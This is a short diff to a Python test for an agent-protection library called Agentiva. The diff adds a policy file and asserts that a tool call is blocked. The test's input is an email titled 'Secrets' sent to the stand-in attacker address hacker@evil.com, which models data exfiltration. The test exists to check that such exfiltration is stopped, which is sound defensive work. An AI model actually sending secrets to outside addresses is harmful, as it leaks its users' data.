@@ -16,7 +16,7 @@ def create_ticket(title: str, priority: str) -> str:
 
 
 def test_shield() -> None:
-    shield = Agentiva(mode="shadow")
+    shield = Agentiva(mode="shadow", policy_path="policies/default.yaml")
     protected = shield.protect([send_email, create_ticket])
     result1 = protected[0].invoke(
         {"to": "hacker@evil.com", "subject": "Secrets", "body": "data"}
@@ -25,7 +25,7 @@ def test_shield() -> None:
     print(f"Email: {result1}")
     print(f"Ticket: {result2}")
     print(f"Shadow Report: {shield.get_shadow_report()}")
-    assert "shadow" in result1.lower()
+    assert "block" in result1.lower() or "blocked" in result1.lower()
     assert shield.get_shadow_report()["total_actions"] == 2
     print("test_langchain passed!")
 
